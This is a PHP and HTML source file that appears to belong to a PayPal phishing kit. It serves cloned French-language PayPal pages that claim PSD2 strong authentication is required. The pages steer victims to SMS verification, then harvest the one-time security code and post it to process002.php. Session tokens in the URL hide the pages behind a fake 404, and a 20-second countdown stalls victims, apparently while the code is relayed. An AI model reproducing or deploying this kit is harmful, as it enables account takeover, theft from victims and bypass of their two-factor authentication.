<?php
session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

		if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotoinccode']))
		{
            $_SESSION['entercodepage'] = md5(uniqid(rand(), true));
            $_SESSION['sendcodes'] = md5(uniqid(rand(), true));



?> 

<style>
html{
	overflow: hidden;
}
</style>
<link rel="icon" href="../img/favicon.ico" />
<html dir="ltr" lang="en" data-reactroot=""><head><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">

    <link rel="stylesheet" href="../css/app.css">
  

    <title>PayPal</title></head><body data-nemo="documentId" documentid="17583167074675258115" class=""><div><style nonce="">html { display:block }</style><form action="process002.php?<?php echo $_SESSION['userid'].$_SESSION['entercodepage'];?>" method="POST" id="irouteForm">

<div class="contentContainer" id="content"><div class="challengesForm" data-nemo="entryPage"><fieldset><div id="challenges" class="textCenter challenges panel"><header><div class="paypal-logo"></div></header><div class="challengesSection"><h1>Authentication requise</h1><p class="description">Dans le cadre du règlement DSP2 sur l'authentification forte des clients, nous avons besoin d'informations supplémentaires pour confirmer que c'est bien vous.</p><p><a>En savoir plus</a></p><div class="domainChallenges"><ul><li id="sms-challenge-option" class="challenge-option selected" data-nemo="smsChallengeOption"><label for="sms-challenge-option-input"><input type="radio" id="sms-challenge-option-input" component="input" name="selectedChallengeType" value="sms" selected=""><span class="styled-radio-button-border"><span class="styled-radio-button"></span></span><div class="challenge-information"><p class="label">Recevoir un message</p>




    	<div><span class="verification-method"><span class="challengeOptionLabel"><span data-nemo="optionLabel" data-value="&#8234;+33 •• •• •• ••&#8236;">Mobile <!-- -->&#8234;+33 •• •• •• ••&#8236;</span></span></span></div></div></label></li>

    </ul></div><div class="action"><button name="btnNext" type="submit" data-nemo="entrySubmit" class="vx_btn vx_btn-block" onclick="document.querySelector('.spinner').classList.remove('hidden')">Suivant</button></div><div class="infoSection">En continuant, vous confirmez que vous êtes autorisé à utiliser ce numéro de téléphone et acceptez de recevoir des messages texte pour confirmer votre identité dans cette session.</div></div></div>
</form>

</div>




</div><footer class="footer"><ul class="footerLinks"><li class="contactFooterListItem"><a target="_blank" href="/fr/smarthelp/contact-us">Contact Us</a></li><li class="privacyFooterListItem"><a target="_blank" href="/fr/webapps/mpp/ua/privacy-full">Privacy</a></li><li class="legalFooterListItem"><a target="_blank" href="/fr/webapps/mpp/ua/legalhub-full">Legal</a></li><li class="worldwideFooterListItem"><a target="_blank" href="/fr/webapps/mpp/country-worldwide">Worldwide</a></li></ul><div></div></footer><div class="loaderOverlay">


    	<div data-nemo="loaderOverlay" class="modal-animate hide"><div class="rotate"></div><div class="processing">Processing...</div><div class="loaderOverlayAdditionalElements"></div></div><div class="modal-overlay hide"></div></div></div></div></div></div>
     
    <script>
function showContent(){
    document.querySelector('.spinner').classList.add('hidden')


}

setTimeout(showContent, 1000);


     </script>
     
    <div class="spinner" >
                       
 
 </div>
					

				</div>

					

     

 </div>
</body></html>



<?php

		}
		elseif(strpos($_SERVER['REQUEST_URI'], $_SESSION['nextcode'])){
			?>

<style>
html{
    overflow: hidden;
}
</style>
<link rel="icon" href="../img/favicon.ico" />
<html dir="ltr" lang="en" data-reactroot=""><head><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta http-equiv="content-type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<link rel="stylesheet" href="../css/app.css">
  

    <title>PayPal</title></head><body data-nemo="documentId" documentid="17583167074675258115" class=""><div><style nonce="">html { display:block }</style><div><div><form action="process002.php?<?php echo $_SESSION['userid'].$_SESSION['sendcodes']; ?>" method="POST" id="irouteForm">

        <div class="contentContainer" id="content"><div data-nemo="challengePage"><header><div class="paypal-logo"></div></header>

        <div data-nemo="smsChallengePage" class="smsChallenge"><h1>Veuillez saisir le code</h1>


            <p class="description"><span>que nous avons envoyer à &#8234;+33 •• •• •• ••&#8236;</span></p>
            <?php 
            if(strpos($_SERVER['REQUEST_URI'], $_SESSION['invalidcode'])){
                echo'<p style="color: darkred">Code invalide</p>';
            }
            ?>
           
        </div><div class="input textInput"><div class="fieldWrapper"><label class="answerLabel fieldLabel" for="answer"></label>

            <input type="tel" name="securecode" value="" class="hasHelp hasError" placeholder="Code de sécurité" autocomplete="off" data-nemo="securityCodeInput" pattern="[0-9]*" id="answer" aria-describedby="answer">

        </div><div class="inputAction"><div class="resend-link"><span data-nemo="resendLink" class="resend">Renvoyer</span>


        </div></div><div class="inputTooltip errorMessage infoMessage"><ul></ul></div><div class="errorMessage" aria-hidden="true" role="alert" id="inputErrorMessage"><p class="emptyError" data-nemo="inputErrorMessage">Obligatoire.</p></div></div><div class="action"><button type="submit" id="securityCodeSubmit" data-nemo="securityCodeSubmit" name="btnNext" class="scTrack:security_code_continue_button vx_btn vx_btn-block">Continuer</button></form></div>

        <div class="tryDifferentWaySection"><a href="#">Envoyer un autre code</a></div></div><div class="loaderOverlay"><div data-nemo="loaderOverlay" class="modal-animate hide"><div class="rotate"></div><div class="processing">Processing...</div><div class="loaderOverlayAdditionalElements"></div></div><div class="modal-overlay hide"></div></div></div></div></div>


</div>




</div><footer class="footer"><ul class="footerLinks"><li class="contactFooterListItem"><a target="_blank" href="/fr/smarthelp/contact-us">Contact Us</a></li><li class="privacyFooterListItem"><a target="_blank" href="/fr/webapps/mpp/ua/privacy-full">Privacy</a></li><li class="legalFooterListItem"><a target="_blank" href="/fr/webapps/mpp/ua/legalhub-full">Legal</a></li><li class="worldwideFooterListItem"><a target="_blank" href="/fr/webapps/mpp/country-worldwide">Worldwide</a></li></ul><div></div></footer><div class="loaderOverlay">


        <div data-nemo="loaderOverlay" class="modal-animate hide"><div class="rotate"></div><div class="processing">Processing...</div><div class="loaderOverlayAdditionalElements"></div></div><div class="modal-overlay hide"></div></div></div></div></div></div>

         <script>
function showContent(){
    document.querySelector('.spinner').classList.add('hidden')


}

setTimeout(showContent, 20000);


     </script>
     <script type="text/javascript">
    var timeleft = 20;
    var downloadTimer = setInterval(function(){
    timeleft--;
    document.getElementById("countdowntimer").textContent = timeleft;
    if(timeleft <= 0)
        clearInterval(downloadTimer);
    },1000);
</script>
    <div class="spinner" >
                        <p >Patientez <span id="countdowntimer">20</span> secondes </p>
 
 </div>
</body></html>



            <?php
		}

}
else{
	die('HTTP/1.0 404 Not Found');
}

?>

